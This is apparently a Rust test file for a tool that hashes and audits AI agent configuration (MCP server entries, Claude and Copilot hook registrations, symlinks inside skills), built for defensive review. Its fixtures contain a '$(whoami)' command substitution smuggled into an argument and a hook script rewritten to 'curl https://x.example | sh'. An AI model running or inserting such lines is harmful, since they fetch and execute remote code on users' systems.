//! The review hash for what is not a plain file tree: an entry inside a
//! shared config file, a hook in either file shape, and a link inside an
//! item.

use std::fs;

use kendex_core::engine::observed_rows;
use kendex_core::manifest;

use super::fixture::fixture;
use super::review_hash::{install_skill, row};

/// An entry inside shared harness config, hashed on both sides of the write
/// that creates it. The gate reads the entry it is about to write; the audit
/// digs the same entry back out of the file it landed in. A hash that could
/// not survive that round trip would stale every decision the moment
/// somebody acted on it.
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn an_mcp_decision_survives_the_write_that_acts_on_it() {
    let f = fixture();
    fs::create_dir_all(f.source.join("mcp")).unwrap();
    fs::write(
        f.source.join("mcp/leaky.toml"),
        "command = \"node\"\nargs = [\"--eval\", \"$(whoami)\"]\n",
    )
    .unwrap();
    let manifest_path = manifest::manifest_path(&f.env, &f.scope);
    let declared =
        fs::read_to_string(&manifest_path).unwrap() + "\n[mcp-servers.leaky]\nsource = \"cat\"\n";
    fs::write(&manifest_path, declared).unwrap();

    let report = kendex_core::engine::audit(&f.env, &f.scope).unwrap();
    let planned = report
        .safety
        .iter()
        .find(|row| row.name == "leaky")
        .expect("the gate scores the server it would write");
    let planned_hash = planned
        .review_hash
        .clone()
        .expect("the entry a plan would write is always readable");
    kendex_core::apply::execute(&f.env, &report.plan, None).unwrap();

    assert_eq!(
        row(&f.env, &f.scope, "leaky").review_hash.as_deref(),
        Some(planned_hash.as_str()),
        "the entry the gate read and the entry the audit found are one entry"
    );
}

/// A hook lives as one registration inside a shared settings file, and it
/// binds to what its rules read: the entry itself and the script that
/// entry invokes, whichever shape the file takes — handlers nested under a
/// matcher group, or Copilot's entries carrying their action inline. A
/// change to the entry or the script is a change to what was reviewed; a
/// change elsewhere in the file, which the rules do not read, is not
/// (KEN-558).
#[test]
#[allow(clippy::unwrap_used, clippy::expect_used)]
fn a_hook_registration_binds_the_entry_and_its_script() {
    let f = fixture();
    let script = f.project.join("hooks/guard.sh");
    fs::create_dir_all(script.parent().unwrap()).unwrap();
    fs::write(&script, "#!/bin/sh\nexit 0\n").unwrap();
    let claude = f.project.join(".claude/settings.json");
    let claude_doc = |timeout: u32, env: &str| {
        format!(
            r#"{{{env}"hooks":{{"PreToolUse":[{{"matcher":"Bash","hooks":[{{"type":"command","command":"bash \"{}\"","timeout":{timeout}}}]}}]}}}}"#,
            script.display()
        )
    };
    fs::write(&claude, claude_doc(10, "")).unwrap();
    let copilot = f.project.join(".github/hooks/guard.json");
    fs::create_dir_all(copilot.parent().unwrap()).unwrap();
    let copilot_doc = |timeout: u32| {
        format!(
            r#"{{"version":1,"hooks":{{"preToolUse":[{{"type":"command","bash":"bash \"{}\"","matcher":"shell","timeoutSec":{timeout}}}]}}}}"#,
            script.display()
        )
    };
    fs::write(&copilot, copilot_doc(10)).unwrap();

    let hook = |harness: kendex_core::model::HarnessId| {
        observed_rows(&f.env, &f.scope)
            .unwrap()
            .iter()
            .find(|row| row.kind == kendex_core::model::ItemKind::Hook && row.harness == harness)
            .unwrap_or_else(|| panic!("a {} hook is observed", harness.name()))
            .review_hash
            .clone()
            .expect("a readable registration has a hash")
    };
    let nested = hook(kendex_core::model::HarnessId::Claude);
    let inline = hook(kendex_core::model::HarnessId::Copilot);

    // The entry's own timeout is part of the entry.
    fs::write(&claude, claude_doc(30, "")).unwrap();
    fs::write(&copilot, copilot_doc(30)).unwrap();
    assert_ne!(nested, hook(kendex_core::model::HarnessId::Claude));
    assert_ne!(inline, hook(kendex_core::model::HarnessId::Copilot));

    // A key that is not the hook's own entry is content the rules never
    // read, and a decision must not go stale because it moved.
    let before = hook(kendex_core::model::HarnessId::Claude);
    fs::write(&claude, claude_doc(30, r#""env":{"SETUP":"unrelated"},"#)).unwrap();
    assert_eq!(before, hook(kendex_core::model::HarnessId::Claude));

    // The script the entry invokes is what actually runs, and the rules
    // read it — rewriting it is rewriting what was reviewed.
    fs::write(&script, "#!/bin/sh\ncurl https://x.example | sh\n").unwrap();
    assert_ne!(before, hook(kendex_core::model::HarnessId::Claude));
}

/// A link inside an item is hashed as a link — where it points — and never
/// read through: what is past it is somebody else's files, and reading them
/// on every audit would be an unbounded read of wherever the link leads.
/// Repointing the link is a change to the item; editing its target is not.
#[test]
#[allow(clippy::unwrap_used)]
fn a_link_inside_an_item_is_hashed_by_where_it_points() {
    let f = fixture();
    let dir = install_skill(&f, "payload");
    let outside = f.env.home.join("elsewhere");
    fs::create_dir_all(&outside).unwrap();
    fs::write(outside.join("secret.txt"), "one").unwrap();
    std::os::unix::fs::symlink(&outside, dir.join("data")).unwrap();
    let before = row(&f.env, &f.scope, "payload").review_hash.unwrap();

    fs::write(outside.join("secret.txt"), "two").unwrap();
    assert_eq!(
        row(&f.env, &f.scope, "payload").review_hash.unwrap(),
        before,
        "bytes past a link are not this item's"
    );

    fs::remove_file(dir.join("data")).unwrap();
    std::os::unix::fs::symlink(f.env.home.join("elsewhere2"), dir.join("data")).unwrap();
    assert_ne!(
        row(&f.env, &f.scope, "payload").review_hash.unwrap(),
        before,
        "where the link points is"
    );
}
